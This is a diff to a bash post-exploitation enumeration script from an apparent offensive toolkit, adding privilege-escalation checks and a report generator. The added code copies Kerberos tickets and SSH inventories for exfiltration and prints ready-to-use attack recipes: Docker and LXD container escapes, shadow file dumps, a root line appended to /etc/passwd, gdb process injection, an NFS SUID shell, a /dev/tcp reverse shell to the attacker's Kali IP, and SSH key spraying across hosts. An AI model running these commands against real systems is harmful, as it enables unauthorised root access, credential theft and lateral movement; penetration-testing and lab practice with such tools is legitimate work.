@@ -33,6 +33,11 @@
 set -o pipefail
 # NOT set -e — handle errors individually; one failure must not kill the run
 
+# Resolve absolute path to this script's directory so sibling scripts
+# (crackr.sh, pivotr.sh, sprayr.sh, recon.sh) are reachable regardless
+# of the caller's PWD.
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
 #==============================================================================
 # COLORS & LOGGING
 #==============================================================================
@@ -104,6 +109,8 @@ usage() {
     echo "  --outdir <dir>    Output directory root (default: ./loot)"
     echo "  --quick           Skip slow phases (processes, service monitoring)"
     echo "  --phase <name>    Run only one phase: proof|system|creds|network|files|procs"
+    echo "  --kali-ip <ip>    Kali attacker IP (default: auto-detect from SSH_CLIENT)"
+    echo "  --no-color        Disable ANSI colors (or set NO_COLOR=1)"
     echo "  --help, -h        Show this help"
     echo ""
     echo -e "${BOLD}Output:${NC}"
@@ -280,6 +287,36 @@ phase_system() {
     # sudo -ln avoids password prompt
     info "Checking sudo rights (non-interactive)..."
     sudo -ln 2>&1 | tee "${sdir}/sudo_rights.txt" > /dev/null || true
+
+    # Privileged group membership — docker/lxd/disk/etc are root-equivalent
+    info "Checking privileged group membership..."
+    {
+        echo "=== id ==="
+        id 2>/dev/null || true
+        echo ""
+        echo "=== privileged groups found ==="
+        local _groups _priv_re
+        _groups="$(id -Gn 2>/dev/null || groups 2>/dev/null || true)"
+        _priv_re='\b(docker|lxd|lxc|disk|adm|shadow|wheel|sudo|video|systemd-journal|plugdev|_ssh)\b'
+        if echo " ${_groups} " | grep -oE "${_priv_re}" | sort -u; then
+            :
+        else
+            echo "(none)"
+        fi
+    } > "${sdir}/privileged_groups.txt" 2>/dev/null || true
+
+    # Docker socket — readable = container escape, writable = same
+    info "Checking Docker socket..."
+    {
+        for sock in /var/run/docker.sock /run/docker.sock; do
+            [[ -S "${sock}" ]] || continue
+            echo "${sock} exists"
+            [[ -r "${sock}" ]] && echo "  readable: YES"
+            [[ -w "${sock}" ]] && echo "  writable: YES"
+            ls -la -- "${sock}" 2>/dev/null || true
+        done
+    } > "${sdir}/docker_socket.txt" 2>/dev/null || true
+    [[ -s "${sdir}/docker_socket.txt" ]] && warn "Docker socket detected — see privileged_groups.txt for escape recipe"
 
     # Users with real shells
     info "Collecting users with login shells..."
@@ -466,6 +503,29 @@ phase_creds() {
         find /tmp -maxdepth 2 \( -name "krb5cc_*" -o -name "*.ccache" \) 2>/dev/null || true
     } > "${cdir}/kerberos.txt"
 
+    # Exfil ccache files themselves so operator can just export KRB5CCNAME on Kali
+    local _ccf _ccsafe
+    while IFS= read -r _ccf; do
+        [[ -z "${_ccf}" ]] && continue
+        [[ -r "${_ccf}" ]] || continue
+        _ccsafe="$(echo "${_ccf}" | tr '/' '_')"
+        cp -- "${_ccf}" "${cdir}/ccache${_ccsafe}" 2>/dev/null \
+            && success "Kerberos ccache exfiled: ${_ccf}" || true
+    done < <(find /tmp -maxdepth 2 \( -name "krb5cc_*" -o -name "*.ccache" \) -type f 2>/dev/null)
+
+    # SSH pivot inventory — known_hosts and config list other reachable hosts
+    info "Collecting SSH pivot inventory (config + known_hosts)..."
+    local _sshf _sshsafe
+    while IFS= read -r _sshf; do
+        [[ -z "${_sshf}" ]] && continue
+        [[ -r "${_sshf}" ]] || continue
+        _sshsafe="$(echo "${_sshf}" | tr '/' '_')"
+        cp -- "${_sshf}" "${cdir}/ssh${_sshsafe}" 2>/dev/null || true
+        success "SSH inventory: ${_sshf}"
+    done < <(find /home /root -maxdepth 4 \
+        \( -name "known_hosts" -o -name "config" \) \
+        -path "*/.ssh/*" -type f 2>/dev/null)
+
     success "Credentials collection complete → ${cdir}/"
     progress_log "${OUTDIR}" "DONE" "creds" "Credentials collected"
 }
@@ -618,6 +678,41 @@ phase_files() {
         success "Database files → ${fdir}/database_files.txt"
     fi
 
+    # NFS exports with no_root_squash — classic OffSec privesc
+    info "Checking /etc/exports for no_root_squash..."
+    if [[ -r /etc/exports ]]; then
+        grep -vE '^\s*(#|$)' /etc/exports 2>/dev/null \
+            | grep -iE 'no_root_squash|insecure|rw' \
+            > "${fdir}/nfs_exports.txt" || true
+        if [[ -s "${fdir}/nfs_exports.txt" ]]; then
+            warn "NFS exports with interesting flags → ${fdir}/nfs_exports.txt"
+        fi
+    fi
+
+    # /etc/sudoers.d/* — additional sudo rule files
+    info "Enumerating /etc/sudoers.d/*..."
+    {
+        ls -la /etc/sudoers.d/ 2>/dev/null || true
+        echo ""
+        for _sdf in /etc/sudoers.d/*; do
+            [[ -f "${_sdf}" && -r "${_sdf}" ]] || continue
+            echo "=== ${_sdf} ==="
+            cat -- "${_sdf}" 2>/dev/null || true
+            echo ""
+        done
+    } > "${fdir}/sudoers_d.txt" 2>/dev/null || true
+
+    # Writable systemd unit files and /etc/init.d scripts
+    info "Checking for writable systemd units / init.d scripts (timeout 15s)..."
+    timeout 15 find /etc/systemd /lib/systemd /usr/lib/systemd /etc/init.d \
+        -type f \( -perm -o+w -o -perm -g+w \) 2>/dev/null \
+        > "${fdir}/writable_services.txt" || true
+    if [[ -s "${fdir}/writable_services.txt" ]]; then
+        local ws_count=""
+        ws_count="$(wc -l < "${fdir}/writable_services.txt")"
+        warn "Found ${ws_count} writable service/init files → ${fdir}/writable_services.txt"
+    fi
+
     # Git repositories
     info "Searching for git repos (timeout 20s)..."
     timeout 20 find / -maxdepth 6 \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o -name ".git" -type d -print 2>/dev/null \
@@ -705,7 +800,7 @@ generate_attack_commands() {
             echo "# Exfil both files to Kali first, then:"
             echo "unshadow ${OUTDIR}/creds/passwd.txt ${OUTDIR}/creds/shadow.txt > /tmp/${HOSTNAME_SHORT}_unshadowed.txt"
             echo "# Option A — crackr.sh:"
-            echo "./crackr.sh -f /tmp/${HOSTNAME_SHORT}_unshadowed.txt"
+            echo "${SCRIPT_DIR}/crackr.sh -f /tmp/${HOSTNAME_SHORT}_unshadowed.txt"
             echo "# Option B — direct hashcat (\$6\$=1800, \$1\$=500, \$y\$=400, \$2y\$=3200):"
             echo "hashcat -m 1800 /tmp/${HOSTNAME_SHORT}_unshadowed.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
             echo ""
@@ -740,7 +835,7 @@ generate_attack_commands() {
                 [[ -z "${port}" ]] && continue
                 echo "# Port ${port} (internal only):"
                 echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} ${CUR_USER}@${THIS_HOST_IP}"
-                echo "# OR: ./pivotr.sh ssh --type local --local-port ${port} --target-ip 127.0.0.1 --target-port ${port} --pivot-ip ${THIS_HOST_IP}"
+                echo "# OR: ${SCRIPT_DIR}/pivotr.sh ssh --type local --local-port ${port} --target-ip 127.0.0.1 --target-port ${port} --pivot-ip ${THIS_HOST_IP}"
                 echo "# Then connect: <tool> 127.0.0.1 ${port}"
                 echo ""
             done < "${OUTDIR}/network/internal_listeners.txt"
@@ -799,6 +894,100 @@ generate_attack_commands() {
                     esac
                     echo ""
                 done <<< "${nopasswd_entries}"
+            fi
+        fi
+
+        # ── /etc/sudoers.d/* additional rules ──────────────────────────
+        if [[ -s "${OUTDIR}/files/sudoers_d.txt" ]]; then
+            if grep -qE '^\s*[^#].*ALL\s*=' "${OUTDIR}/files/sudoers_d.txt" 2>/dev/null; then
+                has_actions=true
+                echo "[ SUDOERS.D — additional sudo rules ]"
+                echo "------------------------------------------------------------"
+                echo "# Rules from /etc/sudoers.d/ that may grant privileges missed by 'sudo -l':"
+                grep -E '^\s*[^#].*ALL\s*=' "${OUTDIR}/files/sudoers_d.txt" 2>/dev/null | head -20
+                echo ""
+                echo "# If a rule applies to your user/group, see:"
+                echo "#   cat ${OUTDIR}/files/sudoers_d.txt"
+                echo "# GTFObins: https://gtfobins.github.io/"
+                echo ""
+            fi
+        fi
+
+        # ── Privileged group membership ────────────────────────────────
+        if [[ -s "${OUTDIR}/system/privileged_groups.txt" ]]; then
+            local _priv_hits
+            _priv_hits=$(grep -oE '\b(docker|lxd|lxc|disk|adm|shadow|wheel|sudo|video|systemd-journal|plugdev|_ssh)\b' \
+                "${OUTDIR}/system/privileged_groups.txt" 2>/dev/null | sort -u)
+            if [[ -n "${_priv_hits}" ]]; then
+                has_actions=true
+                echo "[ PRIVILEGED GROUP MEMBERSHIP ]"
+                echo "------------------------------------------------------------"
+                echo "# Current user is in: ${_priv_hits//$'\n'/, }"
+                echo ""
+                while IFS= read -r _pg; do
+                    case "${_pg}" in
+                        docker)
+                            echo "# docker group — root via container mount:"
+                            echo "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+                            echo "# If no alpine image, list local images: docker images"
+                            echo "# Then substitute the image name into the command above."
+                            echo "" ;;
+                        lxd|lxc)
+                            echo "# ${_pg} group — root via privileged container:"
+                            echo "# On Kali: build alpine image (https://github.com/saghul/lxd-alpine-builder)"
+                            echo "# Then on target:"
+                            echo "lxc image import ./alpine-*.tar.gz --alias myalpine"
+                            echo "lxc init myalpine privesc -c security.privileged=true"
+                            echo "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
+                            echo "lxc start privesc && lxc exec privesc /bin/sh"
+                            echo "# Then: cd /mnt/root  (= host /)"
+                            echo "" ;;
+                        disk)
+                            echo "# disk group — raw block read of /dev/sda = read any file:"
+                            echo "debugfs /dev/sda       # then: cat /root/.ssh/id_rsa"
+                            echo "# OR dump /etc/shadow:"
+                            echo "debugfs -R 'cat /etc/shadow' /dev/sda1"
+                            echo "" ;;
+                        shadow)
+                            echo "# shadow group — readable /etc/shadow:"
+                            echo "cat /etc/shadow   # exfil to Kali, crack with hashcat -m 1800"
+                            echo "" ;;
+                        adm)
+                            echo "# adm group — read /var/log/* (may contain passwords from sudo/ssh failures):"
+                            echo "grep -riE 'password|passwd|secret' /var/log/ 2>/dev/null | head -20"
+                            echo "" ;;
+                        systemd-journal)
+                            echo "# systemd-journal — journalctl may contain sensitive cmdline args:"
+                            echo "journalctl --no-pager | grep -iE 'password|token|secret' | head -20"
+                            echo "" ;;
+                        wheel|sudo)
+                            echo "# ${_pg} group — re-check 'sudo -l' (may require password even if NOPASSWD absent):"
+                            echo "sudo -l"
+                            echo "" ;;
+                    esac
+                done <<< "${_priv_hits}"
+            fi
+        fi
+
+        # ── Docker socket accessible ──────────────────────────────────
+        if [[ -s "${OUTDIR}/system/docker_socket.txt" ]]; then
+            if grep -qE 'readable: YES|writable: YES' "${OUTDIR}/system/docker_socket.txt" 2>/dev/null; then
+                has_actions=true
+                echo "[ DOCKER SOCKET ACCESSIBLE — root via API ]"
+                echo "------------------------------------------------------------"
+                echo "# Docker socket is accessible to current user:"
+                cat "${OUTDIR}/system/docker_socket.txt"
+                echo ""
+                echo "# Escape via CLI (requires 'docker' binary in PATH):"
+                echo "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+                echo ""
+                echo "# Escape via raw API (no docker CLI needed — curl --unix-socket):"
+                echo "curl --unix-socket /var/run/docker.sock http://localhost/containers/json"
+                echo "# Create + start a container with host / mounted:"
+                echo "curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \\"
+                echo "  -d '{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/mnt\",\"sh\"],\"HostConfig\":{\"Binds\":[\"/:/mnt\"]}}' \\"
+                echo "  -X POST http://localhost/containers/create"
+                echo ""
             fi
         fi
 
@@ -881,11 +1070,112 @@ generate_attack_commands() {
                     *cap_net_raw*)
                         echo "# Can sniff raw packets:"
                         echo "${cap_path} -i <INTERFACE> -w /tmp/capture.pcap" ;;
+                    *cap_sys_ptrace*)
+                        echo "# Can ptrace root processes — inject shellcode or dump creds:"
+                        echo "# Find a root process to inject into:"
+                        echo "ps -eo pid,user,cmd | awk '\$2==\"root\"'"
+                        echo "# gdb attach + call system() (gdb must also be available):"
+                        echo "gdb -p <ROOT_PID>  # then: (gdb) call system(\"chmod +s /bin/bash\")"
+                        echo "# OR use injector like: https://github.com/gaffe23/linux-inject" ;;
+                    *cap_sys_module*)
+                        echo "# Can load kernel modules — full root + kernel-mode:"
+                        echo "# Build a malicious .ko that execs /bin/bash with setuid(0):"
+                        echo "# See https://0xdf.gitlab.io/2020/09/26/htb-unbalanced.html (search 'cap_sys_module')"
+                        echo "# After building reverse.ko:"
+                        echo "${cap_path}  # to load — or insmod reverse.ko" ;;
+                    *cap_chown*)
+                        echo "# Can change ownership of any file — take over /etc/shadow or /etc/passwd:"
+                        echo "${cap_path} \$(id -u) /etc/shadow && echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd" ;;
+                    *cap_fowner*)
+                        echo "# Can bypass file ownership checks for chmod/utime — flip mode bits:"
+                        echo "${cap_path} /etc/shadow  # then chmod 777 /etc/shadow" ;;
+                    *cap_setgid*)
+                        echo "# Can change GID — escalate to group-privileged (docker/disk/shadow):"
+                        case "${cap_bin}" in
+                            python|python2|python3)
+                                echo "${cap_path} -c 'import os; os.setgid(0); os.setegid(0); os.execl(\"/bin/bash\",\"bash\")'" ;;
+                            *)
+                                echo "# https://gtfobins.github.io/gtfobins/${cap_bin}/#capabilities" ;;
+                        esac ;;
                     *)
                         echo "# https://gtfobins.github.io/gtfobins/${cap_bin}/#capabilities" ;;
                 esac
                 echo ""
             done < "${OUTDIR}/files/capabilities.txt"
+        fi
+
+        # ── NFS exports with no_root_squash ────────────────────────────
+        if [[ -s "${OUTDIR}/files/nfs_exports.txt" ]]; then
+            if grep -qE 'no_root_squash' "${OUTDIR}/files/nfs_exports.txt" 2>/dev/null; then
+                has_actions=true
+                echo "[ NFS no_root_squash — root-squash bypass ]"
+                echo "------------------------------------------------------------"
+                echo "# Exports allowing root writes:"
+                cat "${OUTDIR}/files/nfs_exports.txt"
+                echo ""
+                echo "# From Kali (${KALI_IP}) — mount the share as root:"
+                echo "sudo mkdir -p /mnt/nfsroot"
+                echo "sudo mount -o rw,vers=3 ${THIS_HOST_IP}:<EXPORTED_PATH> /mnt/nfsroot"
+                echo "# Drop a SUID shell:"
+                echo "cat > /tmp/suidshell.c <<'EOF'"
+                echo "#include <unistd.h>"
+                echo "int main(){ setuid(0); setgid(0); execl(\"/bin/bash\",\"bash\",\"-p\",NULL); return 0; }"
+                echo "EOF"
+                echo "gcc /tmp/suidshell.c -o /mnt/nfsroot/suidshell"
+                echo "sudo chown root:root /mnt/nfsroot/suidshell && sudo chmod 4755 /mnt/nfsroot/suidshell"
+                echo "# Back on target:"
+                echo "<EXPORTED_PATH>/suidshell    # spawns root shell"
+                echo ""
+            fi
+        fi
+
+        # ── Writable systemd units / init.d scripts ───────────────────
+        if [[ -s "${OUTDIR}/files/writable_services.txt" ]]; then
+            has_actions=true
+            echo "[ WRITABLE SERVICE FILES — root via service restart ]"
+            echo "------------------------------------------------------------"
+            echo "# Writable systemd / init.d files (may run as root):"
+            cat "${OUTDIR}/files/writable_services.txt"
+            echo ""
+            echo "# 1. Inspect the unit for the user/ExecStart line:"
+            echo "#    grep -E '^(User|ExecStart)' <UNIT_FILE>"
+            echo "# 2. If User=root (or missing), modify ExecStart to your payload:"
+            echo "#    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1'"
+            echo "# 3. Reload + restart:"
+            echo "#    systemctl daemon-reload && systemctl restart <UNIT_NAME>"
+            echo "# 4. Catch on Kali (${KALI_IP}):"
+            echo "penelope -p 4444 -O"
+            echo ""
+        fi
+
+        # ── SSH pivot inventory (known_hosts + config) ────────────────
+        if find "${OUTDIR}/creds/" -maxdepth 1 -name "ssh_*" -type f 2>/dev/null | grep -q .; then
+            has_actions=true
+            echo "[ SSH PIVOT INVENTORY — other reachable hosts ]"
+            echo "------------------------------------------------------------"
+            echo "# SSH config and known_hosts reveal lateral-movement targets."
+            echo ""
+            local _sshinv
+            for _sshinv in "${OUTDIR}/creds/"ssh_*known_hosts; do
+                [[ -f "${_sshinv}" ]] || continue
+                echo "# From $(basename "${_sshinv}"):"
+                awk '{print $1}' "${_sshinv}" 2>/dev/null \
+                    | tr ',' '\n' | grep -vE '^\|1\||^$' | sort -u | head -20
+                echo ""
+            done
+            for _sshinv in "${OUTDIR}/creds/"ssh_*config; do
+                [[ -f "${_sshinv}" ]] || continue
+                echo "# From $(basename "${_sshinv}"):"
+                grep -iE '^(Host |HostName |User )' "${_sshinv}" 2>/dev/null | head -30
+                echo ""
+            done
+            echo "# Try pivoting with collected keys:"
+            echo "for key in ${OUTDIR}/creds/key_*; do"
+            echo "  for host in <HOST_FROM_ABOVE>; do"
+            echo "    ssh -i \"\$key\" -o StrictHostKeyChecking=no ${CUR_USER}@\$host 'id; hostname'"
+            echo "  done"
+            echo "done"
+            echo ""
         fi
 
         # ── Writable cron jobs ─────────────────────────────────────────
@@ -923,11 +1213,11 @@ generate_attack_commands() {
                 [[ -z "${subnet}" ]] && continue
                 echo "# Subnet: ${subnet}"
                 echo "# On Kali — set up pivot first (use this host as pivot):"
-                echo "./pivotr.sh ligolo --pivot-ip ${THIS_HOST_IP} --subnet ${subnet} --serve"
-                echo "# OR: ./pivotr.sh ssh --type dynamic --pivot-ip ${THIS_HOST_IP} --pivot-user ${CUR_USER}"
+                echo "${SCRIPT_DIR}/pivotr.sh ligolo --pivot-ip ${THIS_HOST_IP} --subnet ${subnet} --serve"
+                echo "# OR: ${SCRIPT_DIR}/pivotr.sh ssh --type dynamic --pivot-ip ${THIS_HOST_IP} --pivot-user ${CUR_USER}"
                 echo "# Then scan internally:"
-                echo "sudo ./recon.sh --auto <INTERNAL_HOST_IP>   # replace with a host from ${subnet}"
-                echo "# OR (SOCKS): proxychains sudo ./recon.sh --auto <INTERNAL_HOST_IP>"
+                echo "sudo ${SCRIPT_DIR}/recon.sh --auto <INTERNAL_HOST_IP>   # replace with a host from ${subnet}"
+                echo "# OR (SOCKS): proxychains sudo ${SCRIPT_DIR}/recon.sh --auto <INTERNAL_HOST_IP>"
                 echo ""
             done < "${OUTDIR}/network/reachable_subnets.txt"
         fi
@@ -1058,11 +1348,23 @@ generate_attack_commands() {
                 [[ -z "${git_dir}" ]] && continue
                 local repo_dir="${git_dir%/.git}"
                 echo "# Repo: ${repo_dir}"
+                # Check .git/config for credentialed remote URLs (https://user:pass@host/...)
+                if [[ -r "${git_dir}/config" ]]; then
+                    local _credurl
+                    _credurl=$(grep -oE 'https?://[^[:space:]/]+:[^[:space:]/@]+@[^[:space:]]+' \
+                        "${git_dir}/config" 2>/dev/null | head -5)
+                    if [[ -n "${_credurl}" ]]; then
+                        echo "# [!] Credentialed remote URLs in .git/config:"
+                        while IFS= read -r _u; do echo "#     ${_u}"; done <<< "${_credurl}"
+                    fi
+                fi
                 echo "git -C '${repo_dir}' log --all --oneline 2>/dev/null | head -20"
                 echo "git -C '${repo_dir}' stash list 2>/dev/null"
                 echo "git -C '${repo_dir}' log --all -p --follow -- '*.env' '*.conf' '*.ini' 2>/dev/null | grep -iE 'password|secret|token|key' | head -20"
                 echo "# Look for creds in any commit, not just HEAD:"
                 echo "git -C '${repo_dir}' log --all -p 2>/dev/null | grep -iE '^\\+.*pass|^\\+.*secret|^\\+.*token' | head -20"
+                echo "# Check .git/config for auth tokens in remote URLs:"
+                echo "grep -E 'url\\s*=' '${git_dir}/config' 2>/dev/null"
                 echo ""
             done < "${OUTDIR}/files/git_repos.txt"
         fi
@@ -1143,8 +1445,8 @@ generate_attack_commands() {
             _nm_pass=$(grep -m1 'psk=\|^password=' "${OUTDIR}/creds/networkmanager_creds.txt" 2>/dev/null \
                 | cut -d= -f2 | tr -d '[:space:]' || true)
             _nm_pass="${_nm_pass:-<FOUND_PASSWORD>}"
-            echo "./sprayr.sh -u '${CUR_USER}' -p '${_nm_pass}' -t ${THIS_HOST_IP}"
-            echo "./sprayr.sh --from-creds   # after adding to ${TOOLKIT_ROOT:-~/toolkit}/creds.txt"
+            echo "${SCRIPT_DIR}/sprayr.sh -u '${CUR_USER}' -p '${_nm_pass}' -t ${THIS_HOST_IP}"
+            echo "${SCRIPT_DIR}/sprayr.sh --from-creds   # after adding to ${TOOLKIT_ROOT:-~/toolkit}/creds.txt"
             echo ""
         fi
 
